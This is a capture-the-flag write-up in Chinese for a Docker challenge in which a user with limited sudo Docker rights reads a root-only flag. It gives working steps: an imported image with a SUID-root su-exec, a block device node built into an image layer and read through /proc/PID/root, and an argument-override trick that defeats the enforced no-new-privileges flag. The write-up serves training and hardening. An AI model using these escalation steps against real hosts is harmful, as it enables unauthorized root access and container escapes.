# Docker for Everyone Plus

## 题目简述

题目环境将选手登录为低权限 `user`，但通过 sudoers 允许两类 root 权限的 Docker 操作：从标准输入执行 `docker image load`，以及以强制前缀执行 `docker run`。第一问要求容器以 `-u 1000:1000` 启动，并用黑名单阻止显式设为 UID 0；第二问还强制 `--security-opt=no-new-privileges`，并禁止 `--privileged` 和 `--device`。

flag 位于 QEMU 附加的 virtio 块设备 `/dev/vdb`，`/flag` 只是指向它的软链接。第二问中该块设备的稳定设备号是 major 253、minor 16。

这道题的决定性主障碍是 Docker 守护进程、sudoers 参数限制、镜像元数据、设备 cgroup 和挂载/PID 命名空间的组合边界，因此归类为 `cloud-infra`，而不是仅因有 shell 提权就归为 pwn。

## 解题过程

### No Enough Privilege：从不可信镜像恢复 root

`docker image load` 允许攻击者导入自己构建的完整镜像，包括文件所有者和 SUID 位。因此即使 `docker run` 强制初始 UID 为 1000，镜像内仍可预置一个 SUID-root 工具：

```dockerfile
FROM alpine:latest
RUN apk add --no-cache su-exec && chmod 4755 /sbin/su-exec
```

在本地构建并导出：

```bash
docker build -t hg-docker-plus:suid .
docker save hg-docker-plus:suid -o hg-docker-plus-suid.tar
```

将 tar 上传到题目环境的可写目录（如 `/tmp`）后导入：

```bash
sudo docker image load < /tmp/hg-docker-plus-suid.tar
```

按 sudoers 允许的前缀以 UID 1000 启动容器，但添加特权模式并把宿主根目录只读挂载到 `/host`：

```bash
sudo docker run --rm -u 1000:1000 -it --privileged -v /:/host:ro hg-docker-plus:suid
```

容器内初始身份仍是 1000，但 SUID 位未被 `no_new_privs` 禁止：

```bash
exec /sbin/su-exec root /bin/sh
cat /host/flag
```

`su-exec` 获得有效 UID 0，而 `--privileged` 放开了容器的设备访问；因此 `/host/flag` 指向的块设备可读。这说明“禁止 `docker run -u 0`”并不能消除镜像内文件元数据带来的提权路径。

### Unbreakable!：绕过容器设备 cgroup

第二问的 `no-new-privileges` 会让 SUID 程序无法提升权限，又不允许向容器授予设备或特权模式。不过 Docker 保存镜像层的 `/var/lib/docker` 挂载点没有 `nodev`，所以镜像层可以携带预先创建的设备节点。构建第二个镜像：

```dockerfile
FROM alpine:latest
RUN mknod /flag b 253 16 && chown 1000:1000 /flag
```

导入该镜像后，以强制安全参数启动一个长时间存活的容器进程：

```bash
sudo docker run --rm --security-opt=no-new-privileges -u 1000:1000 hg-docker-plus:device sleep 600
```

在容器里直接 `cat /flag` 会被设备 cgroup 拒绝。但该 `sleep` 进程就是以宿主 UID 1000 运行，因此低权限用户可穿过 procfs 访问它的根文件系统视图。另开一个题目 shell，找到宿主上的 `sleep` PID：

```bash
ps -eo pid,uid,comm,args | grep '[s]leep 600'
```

假设 PID 为 `$PID`，则：

```bash
cat /proc/$PID/root/flag
```

`/proc/$PID/root` 把路径解析带入容器挂载命名空间，所以命中镜像中的块设备节点 `/flag`；但真正执行 `open` 的是宿主上的 `cat`，不受容器设备 cgroup 的拒绝规则约束。设备节点归 UID 1000 所有，因此文件权限也允许当前用户读取。

题目还存在参数覆盖型非预期解：在强制前缀后再加 `--security-opt=no-new-privileges:false`，Docker CLI 会以后值覆盖前值。随后可复用 SUID 镜像取得容器 root，将宿主 `/` 挂入后对 `/host/dev/vdb` 执行 `chmod`，再回到宿主以普通用户读取。这个方法更直接地说明：用字符串黑名单约束一个具有重复参数、长短选项和值覆盖语义的 CLI，很难建立稳定安全边界。

## 方法总结

- 核心技巧：第一问在不可信镜像中预置 SUID-root 程序；第二问预置块设备节点，再通过 `/proc/<pid>/root` 将路径解析与设备访问所处的 cgroup 分离。
- 识别信号：低权限用户可以 root 身份导入任意镜像，`docker run` 只用前缀与黑名单限制，同时暴露 bind mount、PID 和设备节点能力。
- 复用要点：Docker 守护进程本质上拥有宿主 root 能力；不应试图用宽泛 sudoers 通配符安全下放 Docker CLI。需多租户容器时，应优先使用 rootless 容器、受控编排 API、不可变镜像白名单和强隔离运行时。
